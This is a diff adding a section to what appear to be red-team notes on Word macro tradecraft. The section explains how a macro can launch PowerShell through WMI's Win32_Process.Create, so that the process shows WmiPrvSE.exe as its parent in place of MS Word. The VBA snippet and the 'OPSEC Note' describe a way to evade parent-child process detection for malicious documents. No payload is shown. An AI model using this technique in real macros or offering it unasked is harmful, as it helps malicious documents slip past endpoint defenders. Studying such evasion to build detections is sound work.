@@ -38,3 +38,19 @@ Sub AutoOpen()
 
 End Sub
 ```
+
+# Changing Prent-Child Relationship
+
+When a powershell is executed from a word macro a child `powershell.exe` process is created from `winword.exe` (MS Word as a Parent). This isn't normal behaviour and highly suspicious.
+
+With `wmi` we can create another parent process and append the powershell to wmi and not to the MS Word.
+
+
+```VB
+Dim proc As Object
+Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+proc.Create "powershell"
+```
+
+
+> **OPSEC Note**: In that case, powershell will be a child of `WmiPrvSE.exe` rather than MS Word.
